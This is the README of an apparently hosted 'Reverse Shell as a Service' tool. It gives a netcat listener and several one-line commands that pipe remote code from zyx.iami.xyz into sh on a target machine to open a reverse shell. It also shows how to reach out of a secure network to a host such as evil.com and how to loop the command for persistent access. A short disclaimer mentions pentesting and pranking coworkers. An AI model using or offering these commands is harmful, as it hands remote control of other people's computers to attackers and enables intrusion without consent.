# reverse-shell

> Reverse Shell as a Service - https://zyx.iami.xyz modified from https://github.com/lukechilds/reverse-shell and host it in https://www.openode.io/

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target


```shell
curl https://zyx.iami.xyz/192.168.0.69:1337 | sh
```

Go back to your machine, you should now have a shell prompt.

### 3. Don't be a dick

This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.

## Demo

<img src="https://i.imgur.com/qqjhxAw.gif" width="808">

## Tips

### Hostname

You can use a hostname instead of an IP.

```shell
curl https://zyx.iami.xyz/localhost:1337 | sh
```

### Remote connections

Because this is a reverse connection it can punch through firewalls and connect to the internet.

You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with.

```shell
curl https://zyx.iami.xyz/evil.com:1337 | sh
```

### Reconnecting

By default when the shell exits you lose your connection. You may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop.

```shell
while true; do curl https://zyx.iami.xyz/yourip:1337 | sh; done
```

Be careful if you do this to a coworker, if they leave the office with this still running you're opening them up to attack.

## License

MIT © Luke Childs
